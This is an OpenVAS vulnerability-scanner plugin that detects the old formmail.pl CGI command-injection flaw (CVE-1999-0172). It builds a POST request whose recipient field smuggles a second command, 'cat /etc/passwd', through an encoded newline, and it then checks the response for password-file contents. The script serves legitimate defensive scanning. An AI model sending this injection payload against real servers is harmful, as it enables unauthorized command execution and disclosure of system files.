# OpenVAS Vulnerability Test
# $Id: formmail_pl.nasl 17 2013-10-27 14:01:43Z jan $
# Description: formmail.pl
#
# Authors:
# Mathieu Perrin <mathieu@tpfh.org>
#
# Copyright:
# Copyright (C) 1999 Mathieu Perrin
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The 'formmail.pl' is installed. This CGI has
 a well known security flaw that lets anyone execute arbitrary
 commands with the privileges of the http daemon (root or nobody).";

tag_solution = "remove it from /cgi-bin.";

if(description)
{
 script_id(10076);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2079);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_cve_id("CVE-1999-0172");
 
 name = "formmail.pl";
 script_name(name);

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;




 script_description(desc);

 summary = "Checks for the presence of /cgi-bin/formmail.pl";
   
 script_summary(summary);

 script_category(ACT_GATHER_INFO);


 script_copyright("This script is Copyright (C) 1999 Mathieu Perrin");

 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}	  

# deprecated
exit (0);

  
#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if( get_kb_item("Services/www/" + port + "/embedded") ) exit(0);


foreach dir (cgi_dirs())
{
  a = string("POST ", dir, "/formmail.pl HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n");
  aa = string("POST ", dir, "/formmail HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n");

  b = string("Content-length: 120\r\n\r\n");
  c = string("recipient=root@localhost%0Acat%20/etc/passwd&email=openvas@localhost&subject=test\r\n\r\n");
  d = crap(200);
  soc = http_open_socket(port);
  if(soc)
  {
    req1 = a+b+c+d;
    send(socket:soc, data:req1);
    r = http_recv(socket:soc);
    http_close_socket(soc);
    if("root:" >< r)
    {
      security_hole(port);
      exit(0);
    }

    soc2 = http_open_socket(port);
    if(!soc2)exit(0);
    req2 = aa+b+c+d;
    send(socket:soc2, data:req2);
    r2 = http_recv(socket:soc2);
    http_close_socket(soc2);
    if("root:" >< r2)
    {
      security_hole(port);
      exit(0);
    }
   }
}
   